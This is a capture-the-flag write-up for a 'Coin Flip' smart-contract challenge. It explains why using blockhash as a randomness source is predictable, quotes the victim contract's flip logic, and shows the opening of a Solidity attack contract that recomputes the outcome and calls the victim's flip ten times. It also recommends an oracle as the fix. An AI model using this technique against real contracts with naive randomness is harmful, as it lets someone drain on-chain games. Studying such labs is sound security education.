# Coin Flip Challenge - Level 3

```yml
This smart contract has a vulnerability, it's use of the public source of randomness makes it vulnerable because:
```
- the ethereum blockchain is fully transparent and everything is public and can be viewed,

```Solidity
/**  
* @notice Blockhash and block.number are globally accessible variables available to everyone, 
* this is the source of randomness and can be exploited in the attack to calculate the correct side of the coin flip.
* The best practice in this case would be to introduce a source of randomness into a contract with a 
* decentralized oracle to compute random numbers, because there is no native way to generate random numbers in 
* Solidity and everything is publicly visible in the contract.
*/
/// @notice The attack contract can use the same process as the victim contract to find the value for the flip.
function flip(bool _guess) public returns (bool) {
  uint256 blockValue = uint256(blockhash(block.number.sub(1))); 
  uint256 coinFlip = blockValue.div(FACTOR); 
  bool side = coinFlip == 1 ? true : false;
```
  - after the attack contract finds the value for the flip it is assigned to the call to the flip function of the victim contract,
    - the player calls this flip function 10 times in a row to win.

```Solidity
victimContract.flip(side);
```

## 💥 The attack contract in detail:

```yml
The attack contract starts with importing the victim contract:
```

```Solidity
// SPDX-License-Identifier: MIT
// fixed pragma
pragma solidity 0.5.0; 

import "./CoinFlip.sol";
// outdated import for SafeMath, pragma 0.8.0 has SafeMath included in version
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/math/SafeMath.sol";

/// @title attack contract, calculates correct side 10 times in a row
/// @author Web3 Blockchain Developer 
contract CoinFlipAttack {
    /** 
    * @notice Using for directive, using imported SafeMath functions from openzeppelin,
    * for unit256 to prevent overflow and underflow attacks. 
    */
    using SafeMath for uint256;
```

    
    
